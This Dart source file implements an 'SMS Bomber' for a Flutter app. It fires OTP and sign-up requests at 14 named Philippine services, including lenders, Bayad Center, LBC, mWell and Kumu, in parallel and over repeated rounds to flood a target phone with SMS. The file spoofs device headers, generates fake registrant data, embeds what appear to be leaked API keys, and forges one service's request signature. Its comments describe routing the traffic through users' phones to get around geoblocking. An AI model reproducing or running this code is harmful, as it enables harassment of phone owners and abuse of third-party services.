// lib/services/sms_service.dart
//
// ─────────────────────────────────────────────────────────────────────────────
// SmsService — Client-side SMS Bomber
//
// WHY CLIENT-SIDE?
//   When the Railway backend fires these requests, they come from a US/EU
//   cloud IP address. Philippine APIs increasingly geoblock these ranges,
//   causing HTTP 403 / Connection failed errors (e.g. BOMB OTP, BAYAD).
//
//   By firing requests directly from the USER'S PHONE, every request
//   originates from a real Philippine mobile IP — no geoblocking.
//
// HOW IT WORKS:
//   1. Flutter app calls SmsService.bombAll(phone, rounds)
//   2. All 14 services fire in parallel from the user's device
//   3. Results are collected and returned to the screen
//   4. Results are also sent to the Railway backend for logging (optional)
//
// ARCHITECTURE:
//   SmsBomberScreen → SmsService.bombAll() → PH APIs (directly)
//                                          ↘ ApiService.logBombResult() (logging)
//
// ─────────────────────────────────────────────────────────────────────────────

import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:http/http.dart' as http;
import 'package:crypto/crypto.dart';

// ── Result model ──────────────────────────────────────────────────────────────

class SmsResult {
  final String service;
  final bool   success;
  final String message;

  const SmsResult({
    required this.service,
    required this.success,
    required this.message,
  });

  Map<String, dynamic> toJson() => {
    'service': service,
    'success': success,
    'message': message,
  };
}

// ── Main service ──────────────────────────────────────────────────────────────

class SmsService {
  SmsService._();

  static final _rng = Random();

  // ── Phone formatting ────────────────────────────────────────────────────────

  static String _fmt(String phone) {
    phone = phone.replaceAll(RegExp(r'[\s\-\+]'), '');
    if (phone.startsWith('0'))       phone = phone.substring(1);
    else if (phone.startsWith('63')) phone = phone.substring(2);
    return phone;
  }

  // ── Random helpers ──────────────────────────────────────────────────────────

  static String _rstr(int n) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return List.generate(n, (_) => chars[_rng.nextInt(chars.length)]).join();
  }

  static String _gmail() {
    final n = 8 + _rng.nextInt(5);
    return '${_rstr(n)}@gmail.com';
  }

  static String _pick(List<String> list) => list[_rng.nextInt(list.length)];

  static String _shortErr(Object e) {
    final msg = e.toString();
    if (msg.contains('SocketException') || msg.contains('Connection refused')) {
      return 'Connection failed';
    }
    if (msg.contains('TimeoutException') || msg.contains('timed out')) {
      return 'Request timed out';
    }
    if (msg.contains('HandshakeException')) {
      return 'SSL error';
    }
    final short = msg.length > 50 ? msg.substring(0, 50) : msg;
    return short;
  }

  // ── Individual service senders ────────────────────────────────────────────

  static Future<SmsResult> _sendBombOtp(String phone) async {
    const name = 'BOMB OTP';
    try {
      final p    = _fmt(phone);
      final pass = 'TempPass${_rng.nextInt(9000) + 1000}!';
      final r    = await http.post(
        Uri.parse('https://prod.services.osim-cloud.com/identity/api/v1.0/account/register'),
        headers: {
          'User-Agent':      'OSIM/1.55.0 (Android 13; CPH2465; OP5958L1; arm64-v8a)',
          'Accept':          'application/json',
          'Accept-Encoding': 'gzip',
          'Content-Type':    'application/json; charset=utf-8',
          'accept-language': 'en-SG',
          'region':          'PH',
        },
        body: jsonEncode({'userName': p, 'phoneCode': '63', 'password': pass}),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200 || r.statusCode == 201) {
        return SmsResult(service: name, success: true,  message: 'OTP triggered');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendEzloan(String phone) async {
    const name = 'EZLOAN';
    try {
      final p  = _fmt(phone);
      final ts = DateTime.now().millisecondsSinceEpoch;
      final r  = await http.post(
        Uri.parse('https://gateway.ezloancash.ph/security/auth/otp/request'),
        headers: {
          'User-Agent':      'okhttp/4.9.2',
          'Accept':          'application/json',
          'Accept-Encoding': 'gzip',
          'Content-Type':    'application/json',
          'accept-language': 'en',
          'imei':            '7a997625bd704baebae5643a3289eb33',
          'device':          'android',
          'buildtype':       'release',
          'brand':           'oneplus',
          'model':           'CPH2465',
          'manufacturer':    'oneplus',
          'source':          'EZLOAN',
          'channel':         'GooglePlay_Blue',
          'appversion':      '2.0.4',
          'appversioncode':  '2000402',
          'version':         '2.0.4',
          'versioncode':     '2000401',
          'sysversion':      '16',
          'sysversioncode':  '36',
          'customerid':      '',
          'businessid':      'EZLOAN',
          'phone':           '',
          'appid':           'EZLOAN',
          'authorization':   '',
          'blackbox':        'kGPGg${ts}DCl3O8MVBR0',
        },
        body: jsonEncode({
          'businessId':          'EZLOAN',
          'contactNumber':       '+63$p',
          'appsflyerIdentifier': '$ts-${_rng.nextInt(999999999)}',
        }),
      ).timeout(const Duration(seconds: 14));
      if (r.statusCode == 200 || r.statusCode == 201) {
        try {
          final rj   = jsonDecode(r.body) as Map;
          final code = rj['code'] ?? -1;
          final msg  = (rj['msg'] ?? rj['message'] ?? '') as String;
          if (code == 0 || rj['success'] == true) {
            return SmsResult(service: name, success: true, message: msg.isEmpty ? 'OTP sent' : msg);
          }
          if (code == 200 || code == 201) {
            return SmsResult(service: name, success: true, message: msg.isEmpty ? 'OTP sent' : msg);
          }
          return SmsResult(service: name, success: false, message: msg.isEmpty ? 'Code $code' : msg);
        } catch (_) {
          return SmsResult(service: name, success: true, message: 'OTP sent');
        }
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendXpress(String phone) async {
    const name = 'XPRESS PH';
    try {
      final p   = _fmt(phone);
      final ts  = DateTime.now().millisecondsSinceEpoch;
      final uid = _rng.nextInt(9000) + 1000;
      final pwd = 'Pass${_rng.nextInt(9000) + 1000}!Xp';
      final r   = await http.post(
        Uri.parse('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp'),
        headers: {
          'User-Agent':      'Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)',
          'Content-Type':    'application/json',
          'Accept':          'application/json',
          'Accept-Language': 'en-PH',
        },
        body: jsonEncode({
          'FirstName':       'User${ts % 10000}',
          'LastName':        'PH$uid',
          'Email':           _gmail(),
          'Phone':           '+63$p',
          'Password':        pwd,
          'ConfirmPassword': pwd,
        }),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200 || r.statusCode == 201) {
        return SmsResult(service: name, success: true, message: 'OTP sent to phone');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendExcellentLending(String phone) async {
    const name = 'EXCELLENT LENDING';
    try {
      final p      = _fmt(phone);
      final e164   = '+63$p';
      final local0 = '0$p';
      final headers = {
        'User-Agent':      'okhttp/4.12.0',
        'Content-Type':    'application/json; charset=utf-8',
        'Accept':          'application/json',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'en-PH',
      };
      for (final fmt in [p, e164, local0]) {
        try {
          final r = await http.post(
            Uri.parse('https://api.excellenteralending.com/dllin/union/rehabilitation/dock'),
            headers: headers,
            body: jsonEncode({'domain': fmt, 'cat': 'login', 'previous': false, 'financial': _rstr(32)}),
          ).timeout(const Duration(seconds: 12));
          if (r.statusCode == 200 || r.statusCode == 201) {
            try {
              final rj  = jsonDecode(r.body) as Map;
              final msg = (rj['message'] ?? rj['msg'] ?? 'OTP triggered') as String;
              final code = rj['code'];
              if (code == 0 || code == 200 || code == 201 || rj['success'] == true) {
                return SmsResult(service: name, success: true, message: msg);
              }
              if (!rj.containsKey('error') && !rj.containsKey('code')) {
                return SmsResult(service: name, success: true, message: msg);
              }
            } catch (_) {
              return SmsResult(service: name, success: true, message: 'OTP triggered');
            }
          }
          if (r.statusCode == 400 || r.statusCode == 404 || r.statusCode == 422) continue;
          break;
        } catch (_) { break; }
      }
      return SmsResult(service: name, success: false, message: 'Connection failed');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendBistro(String phone) async {
    const name = 'BISTRO';
    try {
      final p = _fmt(phone);
      final r = await http.get(
        Uri.parse('https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63$p'),
        headers: {
          'Host':               'bistrobff-adminservice.arlo.com.ph:9001',
          'User-Agent':         'Mozilla/5.0 (Linux; Android 16; CPH2465) AppleWebKit/537.36 Mobile Safari/537.36',
          'Accept':             'application/json, text/plain, */*',
          'Accept-Encoding':    'gzip, deflate, br',
          'sec-ch-ua-mobile':   '?1',
          'origin':             'http://localhost',
          'x-requested-with':   'com.allcardtech.bistro',
          'sec-fetch-site':     'cross-site',
          'sec-fetch-mode':     'cors',
          'referer':            'http://localhost/',
          'accept-language':    'en-US,en;q=0.9',
        },
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200) {
        final rj = jsonDecode(r.body) as Map;
        if (rj['isSuccessful'] == true) {
          return SmsResult(service: name, success: true, message: rj['message']?.toString() ?? 'OTP sent successfully');
        }
        return SmsResult(service: name, success: false, message: rj['message']?.toString() ?? 'API Error');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendBayad(String phone) async {
    const name = 'BAYAD CENTER';
    try {
      final p     = _fmt(phone);
      final email = _gmail();
      final r     = await http.post(
        Uri.parse('https://api.online.bayad.com/api/sign-up/otp'),
        headers: {
          'accept':           'application/json, text/plain, */*',
          'accept-language':  'en-US',
          'authorization':    '',
          'content-type':     'application/json',
          'origin':           'https://www.online.bayad.com',
          'referer':          'https://www.online.bayad.com/',
          'sec-ch-ua':        '"Chromium";v="127", "Not)A;Brand";v="99"',
          'sec-ch-ua-mobile': '?1',
          'sec-fetch-dest':   'empty',
          'sec-fetch-mode':   'cors',
          'sec-fetch-site':   'same-site',
          'user-agent':       'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Mobile Safari/537.36',
        },
        body: jsonEncode({'mobileNumber': '+63$p', 'emailAddress': email}),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200) {
        return SmsResult(service: name, success: true, message: 'OTP sent');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendLbc(String phone) async {
    const name = 'LBC CONNECT';
    try {
      final p = _fmt(phone);
      // LBC uses form-encoded body (not JSON)
      final r = await http.post(
        Uri.parse('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'),
        headers: {
          'User-Agent':      'Dart/2.19 (dart:io)',
          'Content-Type':    'application/x-www-form-urlencoded',
          'Accept':          'application/json',
          'Accept-Language': 'en-PH',
        },
        body: {
          'verification_type':   'mobile',
          'client_email':        _gmail(),
          'client_contact_code': '+63',
          'client_contact_no':   p,
          'app_log_uid':         _rstr(16),
        },
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200 || r.statusCode == 201) {
        return SmsResult(service: name, success: true, message: 'Verification OTP sent');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendPickupCoffee(String phone) async {
    const name = 'PICKUP COFFEE';
    try {
      final p = _fmt(phone);
      final r = await http.post(
        Uri.parse('https://production.api.pickup-coffee.net/v2/customers/login'),
        headers: {
          'User-Agent':       'okhttp/4.12.0',
          'Content-Type':     'application/json',
          'Accept':           'application/json',
          'Accept-Encoding':  'gzip',
          'Accept-Language':  'en-PH',
          'X-Requested-With': 'com.pickupcoffee.app',
        },
        body: jsonEncode({'mobile_number': '+63$p', 'login_method': 'mobile_number'}),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200 || r.statusCode == 201) {
        return SmsResult(service: name, success: true, message: 'Login OTP sent');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendHoneyLoan(String phone) async {
    const name = 'HONEY LOAN';
    try {
      final p      = _fmt(phone);
      final e164   = '+63$p';
      final local0 = '0$p';
      final headers = {
        'User-Agent':       'okhttp/4.12.0',
        'Content-Type':     'application/json; charset=utf-8',
        'Accept':           'application/json',
        'Accept-Language':  'en-PH,en;q=0.9',
        'Accept-Encoding':  'gzip',
        'app-version':      '2.2.0',
        'platform':         'android',
        'X-Requested-With': 'ph.honeyloan.app',
      };
      final endpoints = [
        'https://api.honeyloan.ph/api/client/registration/step-one',
        'https://api.honeyloan.ph/api/v2/client/registration/send-otp',
      ];
      for (final url in endpoints) {
        for (final ph in [e164, local0]) {
          try {
            final body = <String, dynamic>{'phone': ph, 'is_rights_block_accepted': true};
            if (url.contains('v2')) {
              body['mobile_number'] = ph;
              body['phone_number']  = ph;
            }
            final r = await http.post(
              Uri.parse(url),
              headers: headers,
              body: jsonEncode(body),
            ).timeout(const Duration(seconds: 14));
            if (r.statusCode == 200 || r.statusCode == 201) {
              try {
                final rj  = jsonDecode(r.body) as Map;
                final msg = (rj['message'] ?? rj['msg'] ?? rj['status'] ?? '') as String;
                return SmsResult(service: name, success: true, message: msg.isEmpty ? 'OTP sent' : msg);
              } catch (_) {
                return SmsResult(service: name, success: true, message: 'OTP triggered');
              }
            }
            if (r.statusCode == 400 || r.statusCode == 404 || r.statusCode == 422) continue;
            break;
          } catch (_) { break; }
        }
      }
      return SmsResult(service: name, success: false, message: 'All endpoints unreachable');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendKumu(String phone) async {
    const name = 'KUMU PH';
    try {
      final p   = _fmt(phone);
      final ts  = DateTime.now().millisecondsSinceEpoch ~/ 1000;
      final rnd = _rstr(32);
      // SHA256 signature: sha256(timestamp + random + phone + secret)
      final sigInput = '$ts$rnd${p}kumu_secret_2024';
      final signature = sha256.convert(utf8.encode(sigInput)).toString();
      final r = await http.post(
        Uri.parse('https://api.kumuapi.com/v2/user/sendverifysms'),
        headers: {
          'User-Agent':      'okhttp/5.0.0-alpha.14',
          'Connection':      'Keep-Alive',
          'Accept-Encoding': 'gzip',
          'Content-Type':    'application/json;charset=UTF-8',
          'Device-Type':     'android',
          'Device-Id':       '07b76e92c40b536a',
          'Version-Code':    '1669',
          'X-kumu-Token':    '',
          'X-kumu-UserId':   '',
        },
        body: jsonEncode({
          'country_code':       '+63',
          'encrypt_rnd_string': rnd,
          'cellphone':          p,
          'encrypt_signature':  signature,
          'encrypt_timestamp':  ts,
        }),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200) {
        final rj   = jsonDecode(r.body) as Map;
        final code = rj['code'];
        if (code == 200 || code == 403) {
          return SmsResult(service: name, success: true, message: rj['message']?.toString() ?? 'OTP sent');
        }
        return SmsResult(service: name, success: false, message: 'API error: ${rj['message'] ?? code}');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendS5(String phone) async {
    const name = 'S5.COM';
    try {
      final p = _fmt(phone);
      // S5 uses multipart/form-data (not JSON)
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.s5.com/player/api/v1/otp/request'),
      )
        ..headers['accept']          = 'application/json, text/plain, */*'
        ..headers['user-agent']      = 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
        ..headers['Accept-Encoding'] = 'gzip'
        ..fields['phone_number']     = '+63$p';

      final streamed = await request.send().timeout(const Duration(seconds: 12));
      if (streamed.statusCode == 200) {
        return SmsResult(service: name, success: true, message: 'OTP request sent to S5.com');
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${streamed.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendCashalo(String phone) async {
    const name = 'CASHALO';
    try {
      final p            = _fmt(phone);
      final deviceId     = _rstr(16);
      final appsFlyer    = '${DateTime.now().millisecondsSinceEpoch}-${_rng.nextInt(999999999)}';
      final advertisingId = '${_rstr(8)}-${_rstr(4)}-${_rstr(4)}-${_rstr(4)}-${_rstr(12)}';
      final firebaseId   = _rstr(32);
      final r = await http.post(
        Uri.parse('https://api.cashaloapp.com/access/register'),
        headers: {
          'User-Agent':             'okhttp/4.12.0',
          'Accept-Encoding':        'gzip',
          'Content-Type':           'application/json; charset=utf-8',
          'x-api-key':              'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
          'x-device-identifier':    deviceId,
          'x-device-type':          '1',
          'x-firebase-instance-id': firebaseId,
        },
        body: jsonEncode({
          'phone_number':         p,
          'device_identifier':    deviceId,
          'device_type':          1,
          'apps_flyer_device_id': appsFlyer,
          'advertising_id':       advertisingId,
        }),
      ).timeout(const Duration(seconds: 12));
      if (r.statusCode == 200 || r.statusCode == 201) {
        try {
          final rj = jsonDecode(r.body) as Map;
          if (rj.containsKey('access_challenge_request')) {
            return SmsResult(service: name, success: true, message: 'OTP challenge sent');
          }
          return SmsResult(service: name, success: true, message: rj['message']?.toString() ?? 'OTP sent');
        } catch (_) {
          return SmsResult(service: name, success: true, message: 'OTP sent');
        }
      }
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendMwell(String phone) async {
    const name = 'MWELL';
    try {
      final p = _fmt(phone);
      final deviceModels = [
        'oneplus CPH2465', 'samsung SM-G998B',
        'xiaomi Redmi Note 13', 'realme RMX3700', 'vivo V2318',
      ];
      final appVersions = ['03.942.035', '03.942.036', '03.942.037'];
      final r = await http.post(
        Uri.parse('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number'),
        headers: {
          'User-Agent':                'okhttp/4.11.0',
          'Accept':                    'application/json',
          'Accept-Encoding':           'gzip',
          'Content-Type':              'application/json; charset=utf-8',
          'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
          'x-app-version':             _pick(appVersions),
          'x-device-type':             'android',
          'x-device-model':            _pick(deviceModels),
          'x-timestamp':               '${DateTime.now().millisecondsSinceEpoch}',
          'x-request-id':              _rstr(16),
        },
        body: jsonEncode({'country': 'PH', 'phoneNumber': p, 'phoneNumberPrefix': '+63'}),
      ).timeout(const Duration(seconds: 22));
      if (r.statusCode == 200) {
        final rj = jsonDecode(r.body) as Map;
        if (rj['c'] == 200) {
          return SmsResult(service: name, success: true, message: 'OTP sent');
        }
        return SmsResult(service: name, success: false, message: 'API code ${rj['c']}: ${rj['m'] ?? ''}');
      }
      if (r.statusCode == 401) return SmsResult(service: name, success: false, message: 'Auth key rotated (401)');
      if (r.statusCode == 429) return SmsResult(service: name, success: false, message: 'Rate limited (429)');
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  static Future<SmsResult> _sendPexx(String phone) async {
    const name = 'PEXX';
    try {
      final p         = _fmt(phone);
      final traceId   = _rstr(32);
      final sessionId = _rstr(24);
      final agents    = ['okhttp/4.12.0', 'okhttp/4.11.0', 'okhttp/4.10.0'];
      final versions  = ['3.0.14', '3.0.13', '3.0.12'];
      final r = await http.post(
        Uri.parse('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1'),
        headers: {
          'User-Agent':      _pick(agents),
          'Accept':          'application/json',
          'Accept-Encoding': 'gzip',
          'Content-Type':    'application/json',
          'x-msession-id':   sessionId,
          'x-oid':           '',
          'tid':             _rstr(11),
          'appversion':      _pick(versions),
          'sentry-trace':    traceId,
          'baggage':
            'sentry-environment=production,'
            'sentry-public_key=811267d2b611af4416884dd91d0e093c,'
            'sentry-trace_id=$traceId',
        },
        body: jsonEncode({
          '0': {
            'json': {
              'email':      '',
              'areaCode':   '+63',
              'phone':      '+63$p',
              'otpChannel': 'SMS',
              'otpUsage':   'REGISTRATION',
            }
          }
        }),
      ).timeout(const Duration(seconds: 22));
      if (r.statusCode == 200) {
        try {
          final rj = jsonDecode(r.body) as List;
          if (rj.isNotEmpty) {
            final result = (rj[0]['result']?['data']?['json'] as Map?) ?? {};
            final code   = result['code'];
            final msg    = (result['msg'] ?? result['message'] ?? '') as String;
            if (code == 200) return SmsResult(service: name, success: true, message: 'OTP sent');
            return SmsResult(service: name, success: false, message: 'API code $code: $msg');
          }
        } catch (_) {
          return SmsResult(service: name, success: true, message: 'OTP sent');
        }
      }
      if (r.statusCode == 429) return SmsResult(service: name, success: false, message: 'Rate limited (429)');
      return SmsResult(service: name, success: false, message: 'HTTP ${r.statusCode}');
    } catch (e) {
      return SmsResult(service: name, success: false, message: _shortErr(e));
    }
  }

  // ── Public API ─────────────────────────────────────────────────────────────
  //
  // bombAll() fires all 14 services in parallel from the user's phone.
  // [onServiceDone] is called after EACH service completes so the screen
  // can update live (same pattern as the Telegram bot's live display).

  static Future<({int sent, int failed, List<SmsResult> results})> bombAll({
    required String phone,
    int rounds = 1,
    void Function(SmsResult result, int sent, int failed)? onServiceDone,
  }) async {
    final allResults = <SmsResult>[];
    var sent   = 0;
    var failed = 0;

    final services = <Future<SmsResult> Function(String)>[
      _sendCashalo,
      _sendEzloan,
      _sendPexx,
      _sendMwell,
      _sendXpress,
      _sendExcellentLending,
      _sendBistro,
      _sendBayad,
      _sendLbc,
      _sendPickupCoffee,
      _sendHoneyLoan,
      _sendKumu,
      _sendS5,
      _sendBombOtp,
    ];

    for (var round = 0; round < rounds; round++) {
      // Fire all services in parallel
      final futures = services.map((fn) => fn(phone)).toList();

      // Process results as they complete using Stream
      await Future.wait(
        futures.map((f) async {
          final result = await f;
          allResults.add(result);
          if (result.success) sent++; else failed++;
          onServiceDone?.call(result, sent, failed);
        }),
      );
    }

    return (sent: sent, failed: failed, results: allResults);
  }
}
